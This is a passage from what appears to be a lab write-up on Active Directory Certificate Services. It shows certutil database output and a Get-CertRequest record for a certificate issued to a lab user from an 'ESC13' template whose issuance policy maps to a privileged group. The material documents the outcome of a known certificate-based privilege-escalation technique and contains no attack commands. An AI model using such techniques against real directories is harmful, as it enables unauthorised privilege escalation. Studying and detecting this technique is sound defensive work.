      (TEMPLATE_CLIENT_VER_WIN7<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 3000000 (50331648))
      (TEMPLATE_CLIENT_VER_WIN8<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 4000000 (67108864))
      (TEMPLATE_CLIENT_VER_WINBLUE<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 5000000 (83886080))
      (TEMPLATE_CLIENT_VER_THRESHOLD<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 6000000 (100663296))
      (V7<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 7000000 (117440512))
      (V8<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 8000000 (134217728))
      (V9<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 9000000 (150994944))
      (V10<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- a000000 (167772160))
      (V11<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- b000000 (184549376))
      (V12<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- c000000 (201326592))
      (V13<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- d000000 (218103808))
      (V14<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- e000000 (234881024))
      (V15<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- f000000 (251658240))
  Serial Number: "200000005647456235da6f4aad000000000056"
0000    32 00 30 00 30 00 30 00  30 00 30 00 30 00 30 00   2.0.0.0.0.0.0.0.
0010    35 00 36 00 34 00 37 00  34 00 35 00 36 00 32 00   5.6.4.7.4.5.6.2.
0020    33 00 35 00 64 00 61 00  36 00 66 00 34 00 61 00   3.5.d.a.6.f.4.a.
0030    61 00 64 00 30 00 30 00  30 00 30 00 30 00 30 00   a.d.0.0.0.0.0.0.
0040    30 00 30 00 30 00 30 00  35 00 36 00               0.0.0.0.5.6.

  Issuer Name ID: 0x0 CA Version 0.0
  Certificate Effective Date: 8/17/2025 7:24 PM GMT
  Certificate Expiration Date: 8/17/2026 7:24 PM GMT
  Issued Subject Key Identifier: "95 6e 99 2f 72 7e b0 d4 b0 7d 26 19 80 8e 0d 0b 55 11 cf a2"
0000    39 00 35 00 20 00 36 00  65 00 20 00 39 00 39 00   9.5. .6.e. .9.9.
0010    20 00 32 00 66 00 20 00  37 00 32 00 20 00 37 00    .2.f. .7.2. .7.
0020    65 00 20 00 62 00 30 00  20 00 64 00 34 00 20 00   e. .b.0. .d.4. .
0030    62 00 30 00 20 00 37 00  64 00 20 00 32 00 36 00   b.0. .7.d. .2.6.
0040    20 00 31 00 39 00 20 00  38 00 30 00 20 00 38 00    .1.9. .8.0. .8.
0050    65 00 20 00 30 00 64 00  20 00 30 00 62 00 20 00   e. .0.d. .0.b. .
0060    35 00 35 00 20 00 31 00  31 00 20 00 63 00 66 00   5.5. .1.1. .c.f.
0070    20 00 61 00 32 00                                   .a.2.

  Binary Public Key:
0000    30 82 01 0a 02 82 01 01  00 ce 9a af 28 1e ef 33
0010    23 13 24 f4 82 ce c0 21  30 c2 27 47 32 86 58 9f
0020    b2 4e 4e ca 1e 17 a4 a0  9c 7d 5c 9e 64 b4 d0 0c
0030    6c 88 b4 99 65 a7 02 ca  36 54 a2 fe 37 62 32 3c
0040    f3 bf 4f 7c 56 7d 21 75  56 71 20 f7 83 31 38 0a
0050    10 21 a5 1d ad cc 15 fa  4b 3b c4 dd c1 7e d9 d5
0060    a3 f5 e7 76 bd 5d a2 86  88 74 2c 5c e2 4f 7f 34
0070    e8 98 60 fe a1 26 ed 65  20 56 22 4b e6 06 4f f0
0080    ca 96 1e 5f 00 7f 01 3f  88 6f bb 6d 0e 6f e1 af
0090    d7 19 f7 d5 fb 31 ed 3a  46 a8 da d2 cf 72 38 65
00a0    4e 15 20 80 40 2a b1 e3  0f a9 cc d2 81 59 14 69
00b0    15 29 3f 86 74 c5 04 00  2e 5a 7d 34 45 ce 10 51
00c0    09 cd 2a 4f bb 95 02 21  ac a9 1f d9 49 42 09 46
00d0    16 f1 c4 2e 1b 5d 0c 4d  41 48 10 f6 a5 51 b4 48
00e0    1a 76 f9 79 e1 85 70 90  cd cd 39 84 f3 54 f4 f4
00f0    2f 77 96 d6 8e 4d c4 5c  bc d6 3c b1 08 6f 8f ea
0100    f3 03 63 21 bd 9c a3 a7  fb 02 03 01 00 01

  Public Key Length: 0x800 (2048)
  Public Key Algorithm: "1.2.840.113549.1.1.1" RSA (RSA_SIGN)
0000    31 00 2e 00 32 00 2e 00  38 00 34 00 30 00 2e 00   1...2...8.4.0...
0010    31 00 31 00 33 00 35 00  34 00 39 00 2e 00 31 00   1.1.3.5.4.9...1.
0020    2e 00 31 00 2e 00 31 00                            ..1...1.

  Public Key Algorithm Parameters:
0000    05 00                                              ..

  Publish Expired Certificate in CRL: 0x0
  User Principal Name: "missandei@essos.local"
0000    6d 00 69 00 73 00 73 00  61 00 6e 00 64 00 65 00   m.i.s.s.a.n.d.e.
0010    69 00 40 00 65 00 73 00  73 00 6f 00 73 00 2e 00   i.@.e.s.s.o.s...
0020    6c 00 6f 00 63 00 61 00  6c 00                     l.o.c.a.l.

  Issued Distinguished Name: EMPTY
  Issued Binary Name:
0000    30 00                                              0.

  Issued Country/Region: EMPTY
  Issued Organization: EMPTY
  Issued Organization Unit: EMPTY
  Issued Common Name: EMPTY
  Issued City: EMPTY
  Issued State: EMPTY
  Issued Title: EMPTY
  Issued First Name: EMPTY
  Issued Initials: EMPTY
  Issued Last Name: EMPTY
  Issued Domain Component: EMPTY
  Issued Email Address: EMPTY
  Issued Street Address: EMPTY
  Issued Unstructured Name: EMPTY
  Issued Unstructured Address: EMPTY
  Issued Device Serial Number: EMPTY

Maximum Row Index: 1

1 Rows
  34 Row Properties, Total Size = 3206, Max Size = 1497, Ave Size = 94
   0 Request Attributes, Total Size = 0, Max Size = 0, Ave Size = 0
   0 Certificate Extensions, Total Size = 0, Max Size = 0, Ave Size = 0
  34 Total Fields, Total Size = 3206, Max Size = 1497, Ave Size = 94
CertUtil: -view command completed successfully.
```

</details>

### Get-CertRequest
```
Get-CertRequest -Filter 'RequestID -eq 86'


CA                                          : braavos.essos.local\ESSOS-CA
Request.ID                                  : 86
Request.RequesterName                       : ESSOS\missandei
Request.CommonName                          : Missandei
Request.CallerName                          : ESSOS\missandei
Request.DistinguishedName                   : CN=Missandei
Request.ClientInformation.MachineName       :
Request.ClientInformation.ProcessName       :
Request.ClientInformation.UserName          :
Request.SubjectAltNamesExtension            :
Request.SubjectAltNamesAttrib               :
Request.ApplicationPolicies                 :
UPN                                         : missandei@essos.local
Issued.DistinguishedName                    :
Issued.CommonName                           :
CertificateTemplate                         : ESC13 (1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.74687331.11658720)
EnrollmentFlags                             :
SerialNumber                                : 200000005647456235da6f4aad000000000056
Certificate.SAN                             : Other Name:Principal Name=missandei@essos.local
Certificate.ApplicationPolicies             : [1]Application Certificate Policy:Policy Identifier=Client Authentication
Certificate.IssuancePolicies.PolicyName     : IssuancePolicyESC13
Certificate.IssuancePolicies.GroupCN        : greatmaster
Certificate.IssuancePolicies.GroupSID       : S-1-5-21-666199682-1411342147-2938717855-1106
Certificate.EKU                             : Client Authentication (1.3.6.1.5.5.7.3.2)
Certificate.SID_Extension.SID               : S-1-5-21-666199682-1411342147-2938717855-1117
Certificate.SID_Extension.DistinguishedName : CN=missandei,CN=Users,DC=essos,DC=local
Certificate.SID_Extension.SamAccountName    : missandei
Certificate.SID_Extension.UPN               :
Certificate.SID_Extension.CN                : missandei
RequestDate                                 : 8/17/2025 7:34:16 PM
StartDate                                   : 8/17/2025 7:24:16 PM
EndDate                                     : 8/17/2026 7:24:16 PM
```